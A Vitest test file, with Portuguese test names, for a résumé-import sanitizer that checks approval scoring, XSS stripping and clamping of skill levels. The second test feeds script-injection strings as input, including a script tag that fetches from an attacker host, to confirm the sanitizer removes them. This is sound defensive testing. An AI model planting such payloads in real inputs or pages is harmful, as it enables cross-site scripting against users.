import { describe, it, expect } from 'vitest';
import { ResumeImportInspectorAgent } from '../../services/aiImportInspectorAgent';

describe('Agente Especialista em Importação de Currículos PDF (Auditoria e Resiliência)', () => {
  it('Deve aprovar um payload completo extraído pelo Gemini com alta pontuação de qualidade', () => {
    const geminiPayload = {
      fullName: 'Carlos Alberto Silva',
      role: 'Engenheiro de Dados Sênior',
      email: 'carlos.silva@exemplo.com',
      phone: '(11) 98765-4321',
      summary: 'Profissional com mais de 10 anos de experiência em pipelines ETL, Spark e Big Data.',
      experiences: [
        {
          role: 'Tech Lead Big Data',
          company: 'Fintech Brasil',
          period: '2021 - Presente',
          description: 'Liderança técnica de times e arquitetura de dados em tempo real.'
        }
      ],
      education: [
        {
          degree: 'Ciência da Computação',
          institution: 'Universidade de São Paulo',
          year: '2015',
          type: 'Bacharelado'
        }
      ],
      skills: [
        { name: 'Apache Spark', level: 95 },
        { name: 'Python', level: 90 },
        { name: 'SQL', level: 95 }
      ],
      languages: [
        { name: 'Português', level: 'Nativo' },
        { name: 'Inglês', level: 'Fluente' }
      ],
      hobbies: ['Xadrez', 'Ciclismo']
    };

    const { sanitized, report } = ResumeImportInspectorAgent.auditAndSanitizeGeminiPayload(
      geminiPayload,
      'usr-100'
    );

    expect(report.verdict).toBe('APPROVED');
    expect(report.geminiExtraction.parsingQualityScore).toBe(100);
    expect(report.databasePersistence.neonCompatible).toBe(true);
    expect(sanitized.fullName).toBe('Carlos Alberto Silva');
    expect(sanitized.skills.length).toBe(3);
    expect(sanitized.experiences[0].role).toBe('Tech Lead Big Data');
  });

  it('Deve sanitizar injeções de script (XSS) e manter o padrão seguro', () => {
    const maliciousPayload = {
      fullName: 'João <script>alert("hack")</script>',
      role: 'Desenvolvedor javascript:alert(1)',
      summary: 'Resumo com tag <script>malicioso</script>',
      experiences: [
        {
          role: 'Dev',
          company: 'Corp',
          period: '2020',
          description: 'Ação <script>fetch("http://attacker.com")</script>'
        }
      ],
      education: [],
      skills: []
    };

    const { sanitized, report } = ResumeImportInspectorAgent.auditAndSanitizeGeminiPayload(
      maliciousPayload,
      'usr-200'
    );

    expect(sanitized.fullName).toBe('João');
    expect(sanitized.role).not.toContain('javascript:');
    expect(sanitized.summary).not.toContain('<script>');
    expect(sanitized.experiences[0].description).not.toContain('<script>');
    expect(report.securityCheck.sanitized).toBe(true);
  });

  it('Deve aplicar clamp em valores extremos de nível de habilidade e prover defaults', () => {
    const rawPayload = {
      fullName: 'Ana Paula',
      role: 'Designer',
      skills: [
        { name: 'Figma', level: 9999 }, // Excesso
        { name: 'Photoshop', level: -50 } // Menor que o mínimo
      ]
    };

    const { sanitized } = ResumeImportInspectorAgent.auditAndSanitizeGeminiPayload(
      rawPayload,
      'usr-300'
    );

    expect(sanitized.skills[0].level).toBe(100);
    expect(sanitized.skills[1].level).toBe(10);
  });
});
